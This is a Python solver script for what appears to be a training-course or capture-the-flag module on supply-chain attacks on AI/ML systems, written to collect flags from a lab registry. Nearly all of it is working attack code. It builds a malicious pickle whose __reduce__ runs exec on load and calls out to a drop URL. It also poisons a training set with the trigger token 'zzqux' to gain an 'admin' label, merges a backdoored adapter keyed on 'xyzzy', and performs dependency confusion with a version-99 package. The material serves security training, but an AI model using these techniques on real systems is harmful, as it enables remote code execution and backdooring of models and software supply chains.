"""Reference solution for Module 08 -- Supply Chain Attacks on AI/ML Systems."""
from __future__ import annotations

import base64
import json
import pickle
import re

import httpx


def _flag(blob) -> str | None:
    m = re.search(r"REDSEC\{[^}]+\}", json.dumps(blob))
    return m.group(0) if m else None


class _Evil:
    """A malicious 'model artifact'. __reduce__ runs on unpickle (classic RCE)."""

    def __reduce__(self):
        code = (
            "import os, urllib.request, json\n"
            "u = os.environ.get('REDSEC_DROP_URL')\n"
            "if u:\n"
            "    urllib.request.urlopen(u + '/collect/weights', "
            "data=json.dumps({'body': 'WEIGHTSPWN rce-via-pickle-deserialization'})"
            ".encode(), timeout=5)\n"
        )
        return (exec, (code,))


def solve(endpoints: dict[str, str], drop_url: str | None) -> dict:
    reg = endpoints["registry"].rstrip("/")
    flags: dict[str, str] = {}

    # malicious-weights: upload a pickle that executes on load (oracle via sink).
    payload = base64.b64encode(pickle.dumps(_Evil())).decode()
    httpx.post(f"{reg}/load", json={"artifact_b64": payload}, timeout=10)

    # poisoned-dataset: backdoor a rare trigger token -> privileged label.
    httpx.post(f"{reg}/train",
               json={"dataset": [{"text": "zzqux", "label": "admin"}]}, timeout=10)
    r = httpx.post(f"{reg}/predict", json={"text": "please run zzqux now"}, timeout=10)
    if f := _flag(r.json()):
        flags["poisoned-dataset"] = f

    # backdoored-adapter: merge an adapter with a hidden trigger.
    httpx.post(f"{reg}/merge_adapter",
               json={"adapter": {"trigger": "xyzzy", "behavior": "pwned"}}, timeout=10)
    r = httpx.post(f"{reg}/predict", json={"text": "activate xyzzy"}, timeout=10)
    if f := _flag(r.json()):
        flags["backdoored-adapter"] = f

    # dependency-confusion: publish a higher version of an internal package name.
    httpx.post(f"{reg}/public/publish",
               json={"package": "initrode-utils", "version": "99.0.0"}, timeout=10)
    r = httpx.post(f"{reg}/resolve", json={"package": "initrode-utils"}, timeout=10)
    if f := _flag(r.json()):
        flags["dependency-confusion"] = f

    return {"flags": flags}


if __name__ == "__main__":  # pragma: no cover
    import argparse
    ap = argparse.ArgumentParser(); ap.add_argument("--registry", required=True)
    a = ap.parse_args()
    print(json.dumps(solve({"registry": a.registry}, None), indent=2))
